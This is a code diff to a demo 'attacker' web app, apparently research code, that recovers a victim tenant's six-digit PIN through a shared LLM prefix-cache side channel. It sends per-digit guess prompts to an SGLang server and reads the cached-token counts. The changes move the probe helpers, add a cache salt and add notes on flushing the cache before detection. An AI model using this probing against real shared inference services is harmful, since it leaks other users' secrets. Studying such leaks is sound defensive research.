@@ -1,6 +1,13 @@
 """
 attacker_app.py — "Document Assistant" (Tenant B / User B)
 Port 8002. Zero import of, or reference to, victim_app.py or any secret.
+
+IMPORTANT USAGE NOTE: /detect_pin reads whatever is CURRENTLY in the shared
+cache. It does NOT flush mid-probe (flushing would destroy the victim's
+cached PIN before comparison). For a clean test: call /flush (via victim
+app or curl), have the victim submit, THEN click Detect PIN once. Clicking
+Detect PIN repeatedly without a fresh flush+submit cycle will accumulate
+noise from prior guesses and degrade results.
 """
 import sys, os, secrets
 sys.path.insert(0, os.path.dirname(__file__))
@@ -10,22 +17,9 @@ from fastapi import FastAPI, HTTPException, Header
 from pydantic import BaseModel
 from typing import Optional
 from shared_client import send_to_sglang, flush_cache
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "experiments", "sglang"))
 from config import PIN_LABEL, PIN_SEPARATOR, PIN_TRAILING_MARKER
 
 app = FastAPI(title="Document Assistant (User B)")
-
-PIN_LENGTH = 6
-PLACEHOLDER_DIGIT = "X"  # non-digit placeholder - avoids confound with guessing digit 0
-
-def format_pin(digits: str) -> str:
-    return PIN_SEPARATOR.join(list(digits))
-
-def pin_probe(known_prefix: str, guess_digit: str) -> dict:
-    remaining = PIN_LENGTH - len(known_prefix) - 1
-    guess_digits = known_prefix + guess_digit + PLACEHOLDER_DIGIT * remaining
-    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits) + PIN_TRAILING_MARKER
-    return send_to_sglang(prompt)
 
 SHARED_PUBLIC_PREFIX = (
     "You are a customer support assistant for a cloud infrastructure company. "
@@ -35,8 +29,20 @@ SHARED_PUBLIC_PREFIX = (
     "account-specific context for the current session: "
 ) * 3
 
+PIN_LENGTH = 6
+PLACEHOLDER_DIGIT = "X"  # non-digit, avoids collision with guessing digit '0'
+
 _VALID_USERS = {"user_b": "researcher-controlled-password"}
 _sessions = {}
+
+def format_pin(digits: str) -> str:
+    return PIN_SEPARATOR.join(list(digits))
+
+def pin_probe(known_prefix: str, guess_digit: str) -> dict:
+    remaining = PIN_LENGTH - len(known_prefix) - 1
+    guess_digits = known_prefix + guess_digit + PLACEHOLDER_DIGIT * remaining
+    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits) + PIN_TRAILING_MARKER
+    return send_to_sglang(prompt, cache_salt="tenant_attacker")
 
 class LoginRequest(BaseModel):
     username: str
@@ -66,7 +72,7 @@ def probe(req: ProbeRequest, authorization: Optional[str] = Header(None)):
     if authorization not in _sessions:
         raise HTTPException(status_code=401, detail="not logged in")
     prompt = SHARED_PUBLIC_PREFIX + req.guess
-    result = send_to_sglang(prompt)
+    result = send_to_sglang(prompt, cache_salt="tenant_attacker")
     return {
         "wall_clock_latency": result["wall_clock_latency"],
         "cached_tokens": result["cached_tokens"],
@@ -75,13 +81,11 @@ def probe(req: ProbeRequest, authorization: Optional[str] = Header(None)):
 
 @app.post("/detect_pin")
 def detect_pin(authorization: Optional[str] = Header(None)):
-    """Attacker-side sequential PIN recovery. This function ONLY ever uses
-    its own previously-recovered digits (never ground truth) to build each
-    next probe. No victim data is imported or referenced anywhere here."""
+    """Reads current shared cache state via chained per-digit probing.
+    Does NOT flush mid-probe - see module docstring for correct usage."""
     if authorization not in _sessions:
         raise HTTPException(status_code=401, detail="not logged in")
 
-    import time as _time
     recovered = ""
     per_position_detail = []
 
@@ -124,21 +128,20 @@ def attacker_ui():
       label { display: block; font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 6px; margin-top: 16px; }
       label:first-child { margin-top: 0; }
       input { width: 100%; padding: 11px 14px; border: 1.5px solid #e2e8f0; border-radius: 8px;
-              font-size: 14px; outline: none; transition: border-color 0.15s; }
+              font-size: 14px; outline: none; }
       input:focus { border-color: #0d9488; }
       button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
-               cursor: pointer; margin-top: 20px; transition: opacity 0.15s; }
+               cursor: pointer; margin-top: 20px; }
       .btn-primary { background: #0d9488; color: #fff; }
-      .btn-primary:hover { opacity: 0.9; }
       .btn-detect { background: #0f172a; color: #fff; }
-      .btn-detect:hover { opacity: 0.9; }
+      .btn-flush { background: #f97316; color: #fff; margin-top: 10px; }
       .btn-secondary { background: #f1f5f9; color: #475569; margin-top: 10px; }
-      .btn-secondary:hover { background: #e2e8f0; }
       .status-bar { display: flex; align-items: center; gap: 8px; background: #f0fdfa; border: 1px solid #99f6e4;
                     border-radius: 8px; padding: 10px 14px; margin-bottom: 20px; font-size: 13px; color: #0f766e; }
       .dot { width: 8px; height: 8px; border-radius: 50%; background: #14b8a6; }
       .msg { margin-top: 16px; font-size: 14px; color: #1e293b; min-height: 18px; padding: 12px; background: #f8fafc; border-radius: 8px; }
       .result-pin { font-size: 20px; font-weight: 700; letter-spacing: 4px; color: #0f172a; }
+      .warn { font-size: 12px; color: #92400e; background: #fef3c7; padding: 8px 10px; border-radius: 6px; margin-top: 12px; }
       .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid #cbd5e1; border-top-color: #0d9488;
                  border-radius: 50%; animation: spin 0.7s linear infinite; margin-right: 6px; vertical-align: -1px; }
       @keyframes spin { to { transform: rotate(360deg); } }
@@ -164,6 +167,7 @@ def attacker_ui():
           <button class="btn-primary" onclick="probe()">Send probe</button>
           <button class="btn-detect" onclick="detectPin()">Detect PIN</button>
           <button class="btn-secondary" onclick="logout()">Sign out</button>
+          <div class="warn">For a clean test: flush cache, have victim submit, then click Detect PIN once. Repeated clicks without a fresh flush+submit will degrade results.</div>
           <div class="msg" id="msg" style="display:none;"></div>
         </div>
       </div>
@@ -185,7 +189,7 @@ def attacker_ui():
       const d = await r.json();
       const msg = document.getElementById('msg');
       msg.style.display = 'block';
-      msg.innerHTML = 'cached_tokens: <b>' + d.cached_tokens + ' / ' + d.prompt_tokens + '</b> &middot; ' + d.wall_clock_latency.toFixed(4) + 's';
+      msg.innerHTML = 'cached_tokens: <b>' + d.cached_tokens + ' / ' + d.prompt_tokens + '</b>';
     }
     async function detectPin() {
       const msg = document.getElementById('msg');
